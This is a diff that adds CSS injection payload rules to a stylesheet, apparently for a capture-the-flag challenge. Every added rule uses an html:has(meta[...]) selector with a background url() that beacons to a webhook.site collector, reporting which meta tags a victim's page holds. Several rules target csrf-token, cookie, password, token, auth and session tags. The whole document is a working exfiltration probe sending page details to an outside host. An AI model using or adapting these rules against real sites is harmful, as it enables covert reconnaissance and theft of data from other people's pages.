@@ -80,3 +80,64 @@ meta[name="msapplication-TileColor"] {
 meta[name="msapplication-config"] {
   background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_ms_config_present");
 }
+/* Check for common meta tag attributes */
+
+/* name attribute */
+html:has(meta[name]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_name");
+}
+
+/* content attribute */
+html:has(meta[content]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_content");
+}
+
+/* http-equiv attribute */
+html:has(meta[http-equiv]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_http_equiv");
+}
+
+/* charset attribute */
+html:has(meta[charset]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_charset");
+}
+
+/* property attribute */
+html:has(meta[property]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_property");
+}
+
+/* specific name attribute checks */
+html:has(meta[name="csrf-token"]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?csrf_token");
+}
+
+html:has(meta[name="flag"]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_name");
+}
+
+html:has(meta[name="cookie"]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_name");
+}
+
+html:has(meta[name="password"]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?password_name");
+}
+
+html:has(meta[name="token"]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?token_name");
+}
+
+html:has(meta[name="auth"]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?auth_name");
+}
+
+html:has(meta[name="session"]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?session_name");
+}
+
+/* generic meta existence */
+html:has(meta) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_exists");
+}
+
